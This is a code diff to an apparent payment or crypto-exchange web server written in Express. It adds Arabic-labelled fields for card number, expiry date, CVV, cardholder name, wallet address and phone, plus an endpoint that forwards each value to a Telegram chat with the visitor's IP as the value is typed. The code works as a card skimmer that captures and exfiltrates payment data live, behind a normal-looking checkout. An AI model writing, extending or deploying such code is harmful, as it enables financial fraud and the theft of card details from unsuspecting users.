@@ -47,6 +47,29 @@ function generateOrderId() {
   return `#${orderCounter}`;
 }
 
+const fieldLabels = {
+  amount: "💰 المبلغ",
+  walletAddress: "📦 عنوان المحفظة",
+  cardName: "👤 اسم صاحب البطاقة",
+  cardNumber: "🔢 رقم البطاقة",
+  expiryDate: "📅 تاريخ الانتهاء",
+  cvv: "🔐 CVV",
+  phone: "📱 رقم الهاتف",
+  couponCode: "🎟 كود الخصم",
+};
+
+app.post("/api/telegram/live-field", async (req, res) => {
+  try {
+    const { field, value } = req.body;
+    if (!field || !value) return res.json({ success: false });
+    const ip = getClientIP(req);
+    const label = fieldLabels[field] || field;
+    const msg = `✏️ <b>كتابة مباشرة</b>\n\n${label}: <b>${value}</b>\n\n🌐 IP: ${ip}`;
+    await sendTelegramMessage(msg);
+    res.json({ success: true });
+  } catch { res.json({ success: false }); }
+});
+
 app.get("/api/config/rate", (_req, res) => {
   res.json({ rate: exchangeRate, ratePerHundred: exchangeRate * 100 });
 });
